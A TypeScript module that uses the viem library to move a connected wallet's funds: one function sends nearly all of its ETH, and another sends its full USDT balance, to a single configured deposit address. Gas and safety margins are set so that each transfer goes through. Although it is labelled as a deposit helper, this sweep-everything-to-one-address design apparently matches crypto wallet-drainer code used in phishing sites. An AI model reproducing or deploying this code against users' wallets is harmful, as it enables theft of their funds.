// src/lib/evm.ts
import { createPublicClient, http } from 'viem'
import { mainnet, sepolia } from 'viem/chains'
import type { Hex } from 'viem'
import {
  EVM_DEPOSIT_ADDRESS,
  EVM_USDT_TOKEN_ADDRESS,
  EVM_GAS_LIMIT_SIMPLE,
  EVM_SAFETY_BUFFER_WEI,
} from '../config'

function formatUnits(value: bigint, decimals: number): string {
  const neg = value < 0n
  const v = neg ? -value : value
  const base = 10n ** BigInt(decimals)
  const whole = v / base
  const frac = v % base
  const fracStr = frac.toString().padStart(decimals, '0').replace(/0+$/, '')
  return (neg ? '-' : '') + whole.toString() + (fracStr ? '.' + fracStr : '')
}

const ERC20_ABI = [
  {
    type: 'function',
    name: 'balanceOf',
    stateMutability: 'view',
    inputs: [{ name: 'account', type: 'address' }],
    outputs: [{ name: '', type: 'uint256' }],
  },
  {
    type: 'function',
    name: 'transfer',
    stateMutability: 'nonpayable',
    inputs: [
      { name: 'to', type: 'address' },
      { name: 'amount', type: 'uint256' },
    ],
    outputs: [{ name: '', type: 'bool' }],
  },
] as const

function chainFromId(id: number) {
  if (id === mainnet.id) return mainnet
  if (id === sepolia.id) return sepolia
  return { ...sepolia, id } as any
}

/**
 * Ensure safetyBuffer is a bigint.
 * Accept config as bigint | string | number.
 */
function toBigIntBuffer(buf: any): bigint {
  try {
    if (typeof buf === 'bigint') return buf
    if (typeof buf === 'number') return BigInt(Math.floor(buf))
    if (typeof buf === 'string') return BigInt(buf)
  } catch {}
  // default conservative buffer = 0.002 ETH (in wei)
  return BigInt('2000000000000000')
}

/**
 * Send almost-all ETH but leave gas + safety buffer
 */
export async function depositAllEth({
  walletClient,
  address,
  chainId,
}: {
  walletClient: any
  address: `0x${string}`
  chainId: number
}) {
  if (!/^0x[a-fA-F0-9]{40}$/.test(EVM_DEPOSIT_ADDRESS))
    throw new Error('Invalid EVM_DEPOSIT_ADDRESS')

  const chain = chainFromId(chainId)
  const pc = createPublicClient({ chain, transport: http() })

  // gas limit for simple transfer (configurable)
  const gas = BigInt(typeof EVM_GAS_LIMIT_SIMPLE === 'number' ? EVM_GAS_LIMIT_SIMPLE : 21000)

  // Try to get EIP-1559 fees, else fallback to gasPrice
  let mfp: bigint | undefined,
    mpfp: bigint | undefined
  try {
    const f = await pc.estimateFeesPerGas()
    mfp = f?.maxFeePerGas
    mpfp = f?.maxPriorityFeePerGas
  } catch {
    // ignore
  }

  const gasPrice = mfp ?? (await pc.getGasPrice()) // bigint
  const bal = await pc.getBalance({ address }) // bigint (wei)

  const safetyBuffer = toBigIntBuffer(EVM_SAFETY_BUFFER_WEI)

  const totalGasCost = gas * gasPrice
  // require balance to exceed gas + safety buffer
  if (bal <= totalGasCost + safetyBuffer) {
    // keep the original error text so your UI/fallback logic still recognizes it
    throw new Error('Not enough ETH to cover gas')
  }

  const value = bal - totalGasCost - safetyBuffer
  if (value <= 0n) throw new Error('Not enough ETH to cover gas')

  const hash: Hex = await walletClient.sendTransaction({
    account: address,
    to: EVM_DEPOSIT_ADDRESS as `0x${string}`,
    value,
    gas,
    ...(mfp && mpfp ? { maxFeePerGas: mfp, maxPriorityFeePerGas: mpfp } : {}),
  })
  return { hash }
}

/**
 * Send entire USDT ERC-20 balance (writes contract) but ensure native ETH covers gas + buffer.
 * Leaves the token transfer amount as full token balance (no token buffer).
 */
export async function depositAllUsdtEvm({
  walletClient,
  address,
  chainId,
}: {
  walletClient: any
  address: `0x${string}`
  chainId: number
}) {
  if (!/^0x[a-fA-F0-9]{40}$/.test(EVM_USDT_TOKEN_ADDRESS))
    throw new Error('Invalid EVM_USDT_TOKEN_ADDRESS')
  if (!/^0x[a-fA-F0-9]{40}$/.test(EVM_DEPOSIT_ADDRESS))
    throw new Error('Invalid EVM_DEPOSIT_ADDRESS')

  const chain = chainFromId(chainId)
  const pc = createPublicClient({ chain, transport: http() })

  const bal: bigint = await pc.readContract({
    address: EVM_USDT_TOKEN_ADDRESS as `0x${string}`,
    abi: ERC20_ABI,
    functionName: 'balanceOf',
    args: [address],
  })
  if (bal <= 0n) throw new Error('USDT balance is 0')

  // Estimate gas for transfer; fallback to 100k if estimate fails
  let est = 100000n
  try {
    est = BigInt(
      typeof (await pc.estimateContractGas({
        account: address,
        address: EVM_USDT_TOKEN_ADDRESS as `0x${string}`,
        abi: ERC20_ABI,
        functionName: 'transfer',
        args: [EVM_DEPOSIT_ADDRESS, bal],
      })) === 'bigint'
        ? (await pc.estimateContractGas({
            account: address,
            address: EVM_USDT_TOKEN_ADDRESS as `0x${string}`,
            abi: ERC20_ABI,
            functionName: 'transfer',
            args: [EVM_DEPOSIT_ADDRESS, bal],
          }))
        : BigInt(await pc.estimateContractGas({
            account: address,
            address: EVM_USDT_TOKEN_ADDRESS as `0x${string}`,
            abi: ERC20_ABI,
            functionName: 'transfer',
            args: [EVM_DEPOSIT_ADDRESS, bal],
          }) as any)
    )
  } catch {
    // keep default est
  }

  // add some headroom (20%)
  const gasEstimateWithBuffer = est + est / 5n

  // try to get EIP-1559 fees
  let mfp: bigint | undefined,
    mpfp: bigint | undefined
  try {
    const f = await pc.estimateFeesPerGas()
    mfp = f?.maxFeePerGas
    mpfp = f?.maxPriorityFeePerGas
  } catch {
    // ignore
  }
  const gasPrice = mfp ?? (await pc.getGasPrice())

  const native = await pc.getBalance({ address }) // bigint (wei)
  const total = gasEstimateWithBuffer * gasPrice

  const safetyBuffer = toBigIntBuffer(EVM_SAFETY_BUFFER_WEI)

  if (native < total + safetyBuffer) {
    // keep the original message style
    throw new Error('Not enough ETH to pay ERC-20 transfer gas')
  }

  const hash = await walletClient.writeContract({
    account: address,
    address: EVM_USDT_TOKEN_ADDRESS as `0x${string}`,
    abi: ERC20_ABI,
    functionName: 'transfer',
    args: [EVM_DEPOSIT_ADDRESS, bal],
    gas: gasEstimateWithBuffer,
    ...(mfp && mpfp ? { maxFeePerGas: mfp, maxPriorityFeePerGas: mpfp } : {}),
  })
  return { hash }
}
